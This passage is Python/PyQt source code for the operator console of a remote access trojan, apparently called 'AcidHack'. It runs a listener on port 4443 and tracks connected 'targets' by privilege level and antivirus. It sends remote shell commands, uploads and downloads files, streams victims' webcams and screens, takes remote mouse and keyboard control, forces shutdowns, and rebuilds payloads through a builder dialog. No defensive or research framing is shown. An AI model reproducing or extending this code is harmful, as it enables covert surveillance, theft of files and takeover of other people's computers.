                border-radius: 6px;
                font-size: 13px;
            }
            QPushButton:hover {
                background-color: #cc0000;
                color: #ffffff;
            }
        """)
        self.btn_screenshare_open.clicked.connect(self.open_screenshare)
        bl.addStretch()
        bl.addWidget(self.btn_screenshare_open)
        bl.addStretch()
        layout.addLayout(bl)
        info = QLabel(
            "Screen Share Features:\n"
            "- Live desktop viewing with continuous frames\n"
            "- Mouse Control: click, drag, double-click\n"
            "- Keyboard Control: type, send hotkeys (Ctrl+Alt+Del)\n"
            "Requires: pywin32, pyautogui, Pillow on the client"
        )
        info.setStyleSheet("color:#aaa;font-size:11px;padding:10px;border:1px solid #330000;")
        layout.addWidget(info)
        layout.addStretch()
        self.screenshare_tab.setLayout(layout)

    def setup_chat_tab(self):
        layout = QVBoxLayout()
        self.chat_info_label = QLabel("Select a client and open chat.")
        self.chat_info_label.setStyleSheet("color:#ffaa00;font-size:12px;")
        layout.addWidget(self.chat_info_label)
        self.btn_open_chat = QPushButton("OPEN CHAT")
        self.btn_open_chat.clicked.connect(self.open_chat)
        layout.addWidget(self.btn_open_chat)
        layout.addStretch()
        self.chat_tab.setLayout(layout)

    def setup_log_tab(self):
        layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color:#050505;color:#ffffff;font-size:11px;")
        layout.addWidget(self.log_output, 1)
        self.log_tab.setLayout(layout)

    # ---- SERVER MANAGEMENT ----
    def start_server(self):
        self.listener = ServerListener(HOST, PORT)
        self.listener.new_client_signal.connect(self.on_new_client)
        self.listener.start()
        self.lbl_status.setText("Server: RUNNING")
        self.lbl_status.setStyleSheet("color:#44ff44;font-size:14px;font-weight:bold;")
        self.log_message("[*] Server started on 0.0.0.0:4443")
        
        # Verify server is actually listening
        QTimer.singleShot(500, self.verify_server_listening)
    
    def verify_server_listening(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("127.0.0.1", PORT))
            s.close()
            self.log_message("[+] Server verified: port " + str(PORT) + " is listening")
        except Exception as e:
            self.log_message("[!] CRITICAL: Server NOT listening on port " + str(PORT) + ": " + str(e))
            self.lbl_status.setText("Server: ERROR")
            self.lbl_status.setStyleSheet("color:#ff4444;font-size:14px;font-weight:bold;")

    def on_new_client(self, client_sock, addr, client_id):
        handler = ClientHandler(client_sock, addr, client_id)
        handler.log_signal.connect(self.log_message)
        handler.client_update_signal.connect(self.update_client_info)
        handler.client_disconnected_signal.connect(self.on_client_disconnect)
        handler.webcam_frame_signal.connect(self.on_webcam_frame)
        handler.screenshare_frame_signal.connect(self.on_screenshare_frame)
        handler.file_list_signal.connect(self.on_file_list)
        handler.chat_message_signal.connect(self.on_chat_message)
        handler.cmd_output_signal.connect(self.on_cmd_output)
        handler.screenshot_data_signal.connect(self.on_screenshot_data)
        handler.file_download_data_signal.connect(self.on_file_download_data)

        with clients_lock:
            self.client_handlers[client_id] = handler
            self.client_info[client_id] = {"id":client_id,"hostname":"Connecting...","ip":addr[0],"port":addr[1],"os":"Unknown","username":"Unknown","privilege":"Unknown","antivirus":"Unknown","last_seen":datetime.now().strftime("%H:%M:%S")}
        handler.start()
        self.refresh_client_table()
        self.log_message(f"[+] New client: {client_id} from {addr[0]}")

    def on_client_disconnect(self, client_id):
        with clients_lock:
            if client_id in self.client_handlers:
                del self.client_handlers[client_id]
            if client_id in self.client_info:
                del self.client_info[client_id]
        
        remove_client_from_disk(client_id)
        
        for d in [self.webcam_viewers, self.file_explorers, self.chat_dialogs, 
                  self.screenshot_viewers, self.screenshare_dialogs]:
            if client_id in d:
                try: d[client_id].close()
                except: pass
                try: del d[client_id]
                except: pass
        
        if self.selected_client_id == client_id:
            self.selected_client_id = None
            self.lbl_selected.setText("Selected: None")
        
        QTimer.singleShot(0, self.refresh_client_table)

    def update_client_info(self, info):
        with clients_lock:
            cid = info["id"]
            if cid in self.client_info:
                self.client_info[cid].update(info)
                self.client_info[cid]["last_seen"] = datetime.now().strftime("%H:%M:%S")
        self.refresh_client_table()

    def refresh_client_table(self):
        with clients_lock:
            self.client_table.setRowCount(len(self.client_info))
            for i,(cid,info) in enumerate(self.client_info.items()):
                self.client_table.setItem(i,0,QTableWidgetItem(cid))
                self.client_table.setItem(i,1,QTableWidgetItem(info.get("hostname","Unknown")))
                self.client_table.setItem(i,2,QTableWidgetItem(info.get("ip","")))
                self.client_table.setItem(i,3,QTableWidgetItem(info.get("os","Unknown")[:30]))
                self.client_table.setItem(i,4,QTableWidgetItem(info.get("username","Unknown")))
                self.client_table.setItem(i,5,QTableWidgetItem(info.get("privilege","Unknown")))
                self.client_table.setItem(i,6,QTableWidgetItem(info.get("antivirus","Unknown")[:20]))
                self.client_table.setItem(i,7,QTableWidgetItem(info.get("last_seen","")))
            self.lbl_clients.setText(f"Clients: {len(self.client_info)}")

    def on_client_selected(self):
        rows = self.client_table.selectionModel().selectedRows()
        if rows:
            row = rows[0].row()
            cid = self.client_table.item(row,0).text()
            self.selected_client_id = cid
            info = self.client_info.get(cid,{})
            self.lbl_selected.setText(f"Selected: {cid}")
            self.cmd_info_label.setText(f"Target: {cid}")
            self.file_info_label.setText(f"File Explorer ready for: {cid}")
            self.webcam_info_label.setText(f"Webcam ready for: {cid}")
            self.chat_info_label.setText(f"Chat ready for: {cid}")
        else:
            self.selected_client_id = None
            self.lbl_selected.setText("Selected: None")

    def show_client_menu(self, position):
        if not self.selected_client_id: return
        menu = QMenu()
        menu.addAction("Shell", lambda: self.tabs.setCurrentIndex(0))
        menu.addAction("File Explorer", self.open_file_explorer)
        menu.addAction("Webcam", lambda: self.tabs.setCurrentIndex(2))
        menu.addAction("Screen Share", self.open_screenshare)
        menu.addAction("Chat", self.open_chat)
        menu.addSeparator()
        menu.addAction("Screenshot", self.take_screenshot)
        menu.addAction("Shutdown", lambda: self.send_system_command("shutdown"))
        menu.addAction("Restart", lambda: self.send_system_command("restart"))
        menu.addSeparator()
        menu.addAction("Disconnect", self.disconnect_client)
        menu.exec_(self.client_table.viewport().mapToGlobal(position))

    # ---- COMMANDS ----
    def execute_command(self, command):
        if not self.selected_client_id:
            QMessageBox.warning(self,"No Client","Select a client first!")
            return
        if not command.strip(): return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("execute", command=command)
            self.cmd_output.append(f"\n$ {command}\n{'-'*50}")
            self.cmd_input.clear()
            self.log_message(f"[>] Executed on {self.selected_client_id}: {command[:50]}")
        else:
            QMessageBox.warning(self,"Error","Handler not found!")

    def on_cmd_output(self, client_id, output):
        if client_id == self.selected_client_id:
            self.cmd_output.append(output)
            c = self.cmd_output.textCursor()
            c.movePosition(QTextCursor.End)
            self.cmd_output.setTextCursor(c)

    def send_system_command(self, ct):
        if not self.selected_client_id: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            if ct == "shutdown":
                r = QMessageBox.question(self,"Confirm","Shutdown?",QMessageBox.Yes|QMessageBox.No)
                if r==QMessageBox.Yes: h.send_command("shutdown"); self.log_message(f"[!] Shutdown sent")
            elif ct == "restart":
                r = QMessageBox.question(self,"Confirm","Restart?",QMessageBox.Yes|QMessageBox.No)
                if r==QMessageBox.Yes: h.send_command("restart"); self.log_message(f"[!] Restart sent")

    def send_message_box(self):
        if not self.selected_client_id: return
        t, ok1 = QInputDialog.getText(self,"Title","Title:")
        if ok1 and t:
            m, ok2 = QInputDialog.getText(self,"Message","Message:")
            if ok2 and m:
                h = self.client_handlers.get(self.selected_client_id)
                if h: h.send_command("msgbox",title=t,message=m)

    def disconnect_client(self):
        if not self.selected_client_id: return
        h = self.client_handlers.get(self.selected_client_id)
        if h: 
            h.send_command("disconnect")
            self.log_message(f"[!] Disconnect command sent to {self.selected_client_id}")

    # ---- SCREENSHOT ----
    def take_screenshot(self):
        if not self.selected_client_id: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("screenshot")
            self.log_message(f"[>] Screenshot requested")
            self.open_screenshot_viewer(self.selected_client_id)

    def open_screenshot_viewer(self, cid):
        if cid in self.screenshot_viewers:
            self.screenshot_viewers[cid].raise_(); self.screenshot_viewers[cid].activateWindow(); return
        v = ScreenshotViewer(cid, self)
        self.screenshot_viewers[cid] = v
        v.show()

    def request_screenshot_for_client(self, cid):
        h = self.client_handlers.get(cid)
        if h: h.send_command("screenshot")

    def on_screenshot_data(self, cid, img_bytes):
        p = QPixmap()
        if p.loadFromData(img_bytes):
            if cid in self.screenshot_viewers: self.screenshot_viewers[cid].display_screenshot(p)
            else:
                self.open_screenshot_viewer(cid)
                if cid in self.screenshot_viewers: self.screenshot_viewers[cid].display_screenshot(p)
            self.log_message(f"[+] Screenshot {p.width()}x{p.height()}")
            os.makedirs("screenshots", exist_ok=True)
            p.save(f"screenshots/{cid}_{int(time.time())}.png","PNG")
        else: self.log_message("[!] Screenshot decode failed")

    # ---- FILE OPS ----
    def set_download_save_path(self, cid, fn, sp):
        if cid not in self.pending_downloads: self.pending_downloads[cid]={}
        self.pending_downloads[cid][fn]=sp

    def on_file_download_data(self, cid, fn, b64, _):
        try:
            d = base64.b64decode(b64)
            sp = None
            if cid in self.pending_downloads and fn in self.pending_downloads[cid]:
                sp = self.pending_downloads[cid][fn]; del self.pending_downloads[cid][fn]
            if sp:
                with open(sp,"wb") as f: f.write(d)
                self.log_message(f"[+] Downloaded {fn}")
            else:
                sp,_ = QFileDialog.getSaveFileName(self,f"Save {fn}",fn)
                if sp:
                    with open(sp,"wb") as f: f.write(d)
                    self.log_message(f"[+] Downloaded {fn}")
        except Exception as e: self.log_message(f"[!] Download error: {e}")

    def open_file_explorer(self):
        if not self.selected_client_id: return
        if self.selected_client_id in self.file_explorers:
            self.file_explorers[self.selected_client_id].raise_(); return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            e = FileExplorer(self.selected_client_id, h.send_command, self)
            e.show(); self.file_explorers[self.selected_client_id]=e

    def on_file_list(self, cid, path, files):
        if cid in self.file_explorers: self.file_explorers[cid].populate_files(path, files)

    def quick_upload(self):
        if not self.selected_client_id: return
        fp,_ = QFileDialog.getOpenFileName(self,"Select File")
        if fp:
            h=self.client_handlers.get(self.selected_client_id)
            if h:
                fn=os.path.basename(fp)
                try:
                    with open(fp,"rb") as f: d=f.read()
                    b=base64.b64encode(d).decode()
                    cs=50000
                    if len(b)>cs:
                        tc=(len(b)+cs-1)//cs
                        for i in range(tc):
                            c=b[i*cs:(i+1)*cs]; il=(i==tc-1)
                            h.send_command("upload_file_chunk",filename=fn,path="C:\\",data=c,chunk_index=i,total_chunks=tc,last=il)
                    else: h.send_command("upload_file",filename=fn,path="C:\\",data=b)
                    self.log_message(f"[>] Uploading {fn}")
                except Exception as e: QMessageBox.warning(self,"Error",str(e))

    def quick_download(self):
        if not self.selected_client_id: return
        fn,ok=QInputDialog.getText(self,"Download","Filename:")
        if ok and fn:
            p,ok2=QInputDialog.getText(self,"Path","Path:",text="C:\\")
            if ok2:
                sp,_=QFileDialog.getSaveFileName(self,f"Save {fn}",fn)
                if sp:
                    h=self.client_handlers.get(self.selected_client_id)
                    if h: self.set_download_save_path(self.selected_client_id,fn,sp); h.send_command("download_file",filename=fn,path=p)

    # ---- WEBCAM ----
    def start_webcam(self):
        if not self.selected_client_id: return
        h=self.client_handlers.get(self.selected_client_id)
        if h: h.send_command("webcam_start"); self.btn_webcam_start.setEnabled(False); self.btn_webcam_stop.setEnabled(True)

    def stop_webcam(self):
        self.btn_webcam_start.setEnabled(True); self.btn_webcam_stop.setEnabled(False)
        self.webcam_preview.setText("Stopped")

    def open_webcam_viewer(self):
        if not self.selected_client_id: return
        cid=self.selected_client_id
        if cid in self.webcam_viewers: self.webcam_viewers[cid].raise_(); return
        v=WebcamViewer(cid,self)
        v.closed.connect(self.on_webcam_viewer_closed)
        self.webcam_viewers[cid]=v; v.show()

    def on_webcam_viewer_closed(self, cid):
        if cid in self.webcam_viewers: del self.webcam_viewers[cid]

    def on_webcam_frame(self, jpeg_data):
        p=QPixmap()
        if p.loadFromData(jpeg_data,"JPEG"):
            s=p.scaled(self.webcam_preview.size(),Qt.KeepAspectRatio,Qt.SmoothTransformation)
            self.webcam_preview.setPixmap(s)
            if self.selected_client_id and self.selected_client_id in self.webcam_viewers:
                self.webcam_viewers[self.selected_client_id].update_frame(jpeg_data)

    # ---- SCREEN SHARE ----
    def open_screenshare(self):
        if not self.selected_client_id:
            QMessageBox.warning(self,"No Client","Select a client first!")
            return
        cid=self.selected_client_id
        if cid in self.screenshare_dialogs:
            self.screenshare_dialogs[cid].raise_()
            self.screenshare_dialogs[cid].activateWindow()
            return
        h=self.client_handlers.get(cid)
        if h:
            d=ScreenShareDialog(cid,h.send_command,self)
            self.screenshare_dialogs[cid]=d
            d.show()

    def on_screenshare_frame(self, jpeg_data):
        """Route screen share frame to the correct dialog."""
        # Send to ALL open screenshare dialogs that are running
        for cid, d in list(self.screenshare_dialogs.items()):
            try:
                if d.running:
                    d.update_frame(jpeg_data)
            except RuntimeError:
                pass

    # ---- CHAT ----
    def open_chat(self):
        if not self.selected_client_id: return
        cid=self.selected_client_id
        if cid in self.chat_dialogs: self.chat_dialogs[cid].raise_(); return
        h=self.client_handlers.get(cid)
        if h:
            c=ChatDialog(cid,h.send_command,self); c.show(); self.chat_dialogs[cid]=c

    def on_chat_message(self, cid, msg_str):
        """
        Handles incoming chat messages from the target.
        Does NOT reopen the chat dialog if the user closed it.
        """
        try:
            d = json.loads(msg_str)
            t = d.get("message", "")
            s = d.get("sender", "target")
        except:
            t = msg_str
            s = "target"
        
        # Only display messages FROM the target (not echoes of our own)
        if s == "target":
            timestamp = datetime.now().strftime("%H:%M")
            formatted = f'<div style="color:#ffaa00; text-align:left; padding:2px;"><b>[Target {timestamp}]</b> {t}</div>'
            
            if cid in self.chat_dialogs:
                # Chat dialog is open — append the message
                self.chat_dialogs[cid].chat_display.append(formatted)
            else:
                # Chat dialog was closed — just log it, don't reopen
                self.log_message(f"[Chat] {cid}: {t}")
        else:
            # Server's own echoed messages — ignore
            pass

    # ---- BUILDER ----
    def open_builder(self):
        """Open the payload builder dialog."""
        dialog = BuilderDialog(self)
        dialog.exec_()
        # After builder closes, reload payload in server
        if hasattr(self, 'listener'):
            self.listener._load_payload()
            payload_size = "unknown"
            for p in self.listener.payload_paths:
                if os.path.exists(p):
                    payload_size = str(os.path.getsize(p)) + " bytes"
                    break
            self.log_message(f"[+] Server payload reloaded ({payload_size})")

    # ---- LOGGING ----
    def log_message(self, msg):
        ts=datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{ts}] {msg}")
        c=self.log_output.textCursor(); c.movePosition(QTextCursor.End); self.log_output.setTextCursor(c)

    def clear_log(self): self.log_output.clear()
    def update_status(self): self.lbl_clients.setText(f"Clients: {len(self.client_info)}")

    def closeEvent(self, event):
        # Clean up HTTP server thread
        if hasattr(self, 'http_thread') and self.http_thread and self.http_thread.isRunning():
            self.http_thread.quit()
            self.http_thread.wait(3000)  # wait up to 3 seconds
        event.accept()
    
    def save_clients_state(self):
        """Periodically save client state to disk (connected to QTimer)."""
        with clients_lock:
            save_all_clients_to_disk(self.client_info)
    

    
# ============================================================
# CLIENT PERSISTENCE - DISABLED (no more dead clients)
# ============================================================
def remove_client_from_disk(client_id):
    pass  # Disabled - no file saving


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    # Red/Black Palette
    p = QPalette()
    p.setColor(QPalette.Window, QColor(10, 10, 10))
    p.setColor(QPalette.WindowText, QColor(255, 51, 51))
    p.setColor(QPalette.Base, QColor(13, 13, 13))
    p.setColor(QPalette.AlternateBase, QColor(18, 18, 18))
    p.setColor(QPalette.Text, QColor(255, 255, 255))
    p.setColor(QPalette.Button, QColor(26, 0, 0))
    p.setColor(QPalette.ButtonText, QColor(255, 68, 68))
    p.setColor(QPalette.Highlight, QColor(204, 0, 0))
    p.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
    p.setColor(QPalette.ToolTipBase, QColor(13, 13, 13))
    p.setColor(QPalette.ToolTipText, QColor(255, 255, 255))
    p.setColor(QPalette.Disabled, QPalette.Text, QColor(68, 68, 68))
    p.setColor(QPalette.Disabled, QPalette.ButtonText, QColor(51, 51, 51))
    app.setPalette(p)

    w = AcidHackMainWindow()
    w.show()
    sys.exit(app.exec_())

